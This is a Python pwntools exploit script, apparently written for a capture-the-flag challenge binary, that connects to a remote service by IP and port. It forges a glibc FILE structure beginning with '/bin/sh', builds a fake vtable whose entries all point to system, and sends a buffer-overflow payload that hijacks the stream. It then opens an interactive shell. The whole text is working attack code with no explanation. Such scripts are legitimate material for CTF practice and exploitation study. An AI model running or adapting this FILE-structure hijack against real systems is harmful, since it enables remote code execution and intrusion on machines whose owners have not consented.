from pwn import *

#io = process('./chall')
io = remote('45.119.84.224', 9997)
elf = ELF('./chall')

print(io.recv())

fake_stream = b'/bin/sh\0'
fake_stream += p64(0) # _IO_read_ptr
fake_stream += p64(0) # _IO_read_end
fake_stream += p64(0) # _IO_read_base
fake_stream += p64(0) # _IO_write_base
fake_stream += p64(0) # _IO_write_ptr
fake_stream += p64(0) # _IO_write_end
fake_stream += p64(0) # _IO_buf_base
fake_stream += p64(0) # _IO_buf_end
fake_stream += p64(0) # _IO_save_base
fake_stream += p64(0) # _IO_backup_base
fake_stream += p64(0) # _IO_save_end
fake_stream += p64(0) # markers
fake_stream += p64(0) # _chain ptr
fake_stream += p64(3) # nice
fake_stream += p64(0xffffffffffffffff)
fake_stream += p64(0)
fake_stream += p64(0x6011d8)
fake_stream += p64(0xffffffffffffffff)
fake_stream += p64(0)*8
fake_stream += p64(0x6011d0+len(fake_stream)+0x8)


fake_vtable = p64(0)
fake_vtable += p64(0)
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['_IO_new_file_finish'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['_IO_new_file_overflow'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['_IO_new_file_underflow'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['__GI__IO_default_uflow'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['__GI__IO_default_pbackfail'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['_IO_new_file_xsputn'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['__GI__IO_file_xsgetn'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['_IO_new_file_seekoff'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['_IO_default_seekpos'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['_IO_new_file_setbuf'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['_IO_new_file_sync'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['__GI__IO_file_doallocate'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['__GI__IO_file_read'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['_IO_new_file_write'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['__GI__IO_file_seek'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['__GI__IO_file_close'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['__GI__IO_file_stat'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['_IO_default_showmanyc'])
fake_vtable += p64(elf.sym['system']) # p64(libc.sym['_IO_default_imbue'])
fake_vtable += p64(0) * 3

payload = p64(0x1)+b'A'*(0x100-0x8) + p64(0x6011d0) + p64(0) + fake_stream + fake_vtable
pause()
io.sendline(payload)
io.interactive()